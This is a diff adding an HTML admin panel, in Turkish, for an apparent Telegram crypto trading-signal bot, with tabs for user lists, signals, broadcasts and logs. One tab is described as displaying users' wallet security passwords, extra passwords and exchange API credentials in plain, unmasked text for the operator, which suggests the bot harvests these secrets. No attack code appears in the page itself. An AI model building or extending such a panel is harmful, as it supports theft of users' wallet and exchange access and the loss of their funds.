@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Елена Хьюз · Yönetim Paneli</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ================= TOP BAR ================= -->
+<div class="top-bar">
+  <div class="top-brand">
+    <div class="top-flag-badge" style="background:linear-gradient(135deg,rgba(79,70,229,0.5),rgba(59,130,246,0.5));border-color:rgba(99,102,241,0.5)">👑</div>
+    <div>
+      <div class="top-title" id="adm-title">Елена Хьюз · Yönetim</div>
+      <div class="top-subtitle" id="adm-sub">Yalnızca Yetkili Yönetici</div>
+    </div>
+  </div>
+  <div style="display:flex;align-items:center;gap:8px">
+    <a href="index.html" class="btn" style="padding:7px 11px;font-size:12px;gap:4px;text-decoration:none">← Geri</a>
+    <button class="lang-dropdown-btn" id="btn-adm-lang" aria-label="Dil seç">
+      <span>🌐</span>
+      <span id="adm-lang-label">TR</span>
+    </button>
+  </div>
+</div>
+
+<!-- ================= ERİŞİM REDDİ ================= -->
+<div id="denied" class="card" style="display:none;margin-top:20px;border-color:rgba(255,77,77,0.35);text-align:center">
+  <h2 style="color:var(--accent-red);justify-content:center;font-size:16px">🚫 Erişim Engellendi</h2>
+  <p style="font-size:13px;color:var(--text-muted);margin:0;line-height:1.6">
+    Bu sayfayı yalnızca botun yetkili yöneticisi görüntüleyebilir.<br>
+    <small style="font-size:11px;opacity:0.65">(.env içindeki ADMIN_ID)</small>
+  </p>
+</div>
+
+<!-- ================= ADMIN İÇERİK ================= -->
+<div id="content" style="display:none">
+
+  <!-- TABS -->
+  <nav class="tabs" role="tablist" aria-label="Yönetim sekmeleri">
+    <div class="tab active" data-tab="summary"  id="atab-summary"  role="tab">📊 <span id="atab-lbl-summary">Özet</span></div>
+    <div class="tab"        data-tab="users"    id="atab-users"    role="tab">👥 <span id="atab-lbl-users">Kullanıcılar</span></div>
+    <div class="tab"        data-tab="apikeys"  id="atab-apikeys"  role="tab">🔑 <span id="atab-lbl-apikeys">Şifreler</span></div>
+    <div class="tab"        data-tab="signals"  id="atab-signals"  role="tab">📡 <span id="atab-lbl-signals">Sinyaller</span></div>
+    <div class="tab"        data-tab="manage"   id="atab-manage"   role="tab">📢 <span id="atab-lbl-manage">Duyuru</span></div>
+    <div class="tab"        data-tab="logs"     id="atab-logs"     role="tab">📋 <span id="atab-lbl-logs">Loglar</span></div>
+  </nav>
+
+  <!-- ========================================
+       ÖZET SEKMESİ
+       ======================================== -->
+  <section id="apage-summary" class="page active" role="tabpanel">
+
+    <div class="card">
+      <h2>📊 Sistem İstatistikleri</h2>
+      <div class="stat-grid stat-grid-3" style="margin-bottom:10px">
+        <div class="stat"><div class="n blue"  id="s-total">—</div><div class="l" id="adm-lbl-total">Toplam Üye</div></div>
+        <div class="stat"><div class="n green" id="s-active">—</div><div class="l" id="adm-lbl-active">Aktif Üye</div></div>
+        <div class="stat"><div class="n gold"  id="s-wallets">—</div><div class="l" id="adm-lbl-wallets">Cüzdanlar</div></div>
+      </div>
+      <div class="stat-grid stat-grid-3">
+        <div class="stat"><div class="n white" id="s-sig24">—</div><div class="l" id="adm-lbl-sig24">Sinyal (24s)</div></div>
+        <div class="stat"><div class="n gold"  id="s-open">—</div><div class="l" id="adm-lbl-open">Açık İşlem</div></div>
+        <div class="stat"><div class="n red"   id="s-alerts">—</div><div class="l" id="adm-lbl-alerts">Alarmlar</div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>🌐 Dile Göre Kullanıcı Dağılımı</h2>
+      <div id="lang-list"><div class="empty">Yükleniyor…</div></div>
+    </div>
+
+    <button class="btn" id="btn-refresh-summary" style="width:100%;padding:12px">🔄 İstatistikleri Yenile</button>
+
+  </section>
+
+  <!-- ========================================
+       KULLANICILAR SEKMESİ
+       ======================================== -->
+  <section id="apage-users" class="page" role="tabpanel">
+    <div class="card" style="padding:0;overflow:hidden">
+      <div style="overflow-x:auto">
+        <table>
+          <thead>
+            <tr>
+              <th id="adm-th-chatid">Chat ID</th>
+              <th id="adm-th-name">İsim</th>
+              <th id="adm-th-lang">Dil</th>
+              <th id="adm-th-status">Durum</th>
+              <th id="adm-th-action">İşlem</th>
+            </tr>
+          </thead>
+          <tbody id="users-tbody">
+            <tr><td colspan="5" class="empty">Yükleniyor…</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:12px;gap:10px">
+      <button class="btn" id="btn-users-prev" style="flex:1">‹ Önceki</button>
+      <span id="users-info" style="font-size:12px;color:var(--text-muted);text-align:center;flex-shrink:0">Sayfa 1</span>
+      <button class="btn" id="btn-users-next" style="flex:1">Sonraki ›</button>
+    </div>
+  </section>
+
+  <!-- ========================================
+       BORSA ŞİFRELERİ & CÜZDAN PAROLALARI
+       ======================================== -->
+  <section id="apage-apikeys" class="page" role="tabpanel">
+    <div class="card">
+      <h2 id="adm-pwd-title">🔑 Kullanıcı Şifreleri &amp; Borsa API</h2>
+      <p id="adm-pwd-desc" style="font-size:12px;color:var(--text-muted);margin:0 0 14px;line-height:1.6">
+        Kullanıcıların girdiği Cüzdan Güvenlik Şifresi, Ek Şifre ve Borsa API bilgileri
+        <strong style="color:#ff9966">düz metin (maskesiz)</strong> olarak listelenir.
+        Bu veriler yalnızca yetkili yönetici tarafından görülebilir.
+      </p>
+      <div id="apikeys-list"><div class="empty">Yükleniyor…</div></div>
+      <button class="btn" id="btn-refresh-apikeys" style="width:100%;margin-top:12px">🔄 Listeyi Yenile</button>
+    </div>
+  </section>
+
+  <!-- ========================================
+       SİNYALLER SEKMESİ
+       ======================================== -->
+  <section id="apage-signals" class="page" role="tabpanel">
+    <div class="card" style="padding:0;overflow:hidden">
+      <div style="overflow-x:auto">
+        <table>
+          <thead>
+            <tr>
+              <th id="adm-th-symbol">Sembol</th>
+              <th id="adm-th-tf">TF</th>
+              <th id="adm-th-side">Yön</th>
+              <th id="adm-th-entry">Giriş</th>
+              <th id="adm-th-sig-status">Durum</th>
+            </tr>
+          </thead>
+          <tbody id="signals-tbody">
+            <tr><td colspan="5" class="empty">Yükleniyor…</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+    <button class="btn" id="btn-refresh-signals" style="width:100%;margin-top:12px">🔄 Yenile</button>
+  </section>
+
+  <!-- ========================================
+       DUYURU SEKMESİ
+       ======================================== -->
+  <section id="apage-manage" class="page" role="tabpanel">
+    <div class="card">
+      <h2 id="adm-broadcast-title">📢 Tüm Kullanıcılara Duyuru</h2>
+      <p style="font-size:12px;color:var(--text-muted);margin:0 0 12px;line-height:1.6">
+        Telegram HTML formatı desteklenir: &lt;b&gt;kalın&lt;/b&gt;, &lt;i&gt;italik&lt;/i&gt;, &lt;code&gt;kod&lt;/code&gt;
+      </p>
+      <div class="pwd-field-block" style="margin-bottom:12px">
+        <label class="pwd-field-label">Duyuru Metni</label>
+        <textarea id="broadcast-text" rows="5" class="pwd-input" placeholder="Gönderilecek duyuru metnini yazın…"></textarea>
+      </div>
+      <button class="btn btn-main" id="btn-broadcast" style="width:100%;padding:13px;font-size:14px">
+        📢 Yayını Gönder
+      </button>
+    </div>
+  </section>
+
+  <!-- ========================================
+       LOGLAR SEKMESİ
+       ======================================== -->
+  <section id="apage-logs" class="page" role="tabpanel">
+    <div class="card">
+      <h2 id="adm-logs-title">📋 Canlı Bot Logları</h2>
+      <pre id="log-box" class="log-box"></pre>
+      <div style="display:flex;gap:10px;margin-top:10px">
+        <button class="btn" id="btn-refresh-logs" style="flex:1">🔄 Yenile</button>
+        <button class="btn" id="btn-auto-refresh" style="flex:1">▶️ Otomatik Yenile</button>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<!-- DİL MODALI -->
+<div id="adm-lang-modal" class="modal-overlay" role="dialog" aria-modal="true">
+  <div class="modal-card">
+    <h3 style="margin:0 0 16px;color:#fff;display:flex;justify-content:space-between;align-items:center;font-size:16px">
+      <span>🌐 Dil Seçimi</span>
+      <span class="modal-close" id="btn-close-adm-lang" role="button" aria-label="Kapat">✕</span>
+    </h3>
+    <div class="lang-grid">
+      <button class="btn adm-lang-opt" data-lang="ru">🇷🇺 Русский</button>
+      <button class="btn adm-lang-opt" data-lang="en">🇬🇧 English</button>
+      <button class="btn adm-lang-opt" data-lang="tr">🇹🇷 Türkçe</button>
+      <button class="btn adm-lang-opt" data-lang="uk">🇺🇦 Українська</button>
+      <button class="btn adm-lang-opt" data-lang="de">🇩🇪 Deutsch</button>
+      <button class="btn adm-lang-opt" data-lang="es">🇪🇸 Español</button>
+      <button class="btn adm-lang-opt" data-lang="fr">🇫🇷 Français</button>
+      <button class="btn adm-lang-opt" data-lang="ar">🇸🇦 العربية</button>
+    </div>
+  </div>
+</div>
+
+<div id="toast-container" aria-live="polite"></div>
+<script type="module" src="admin.js"></script>
+</body>
+</html>
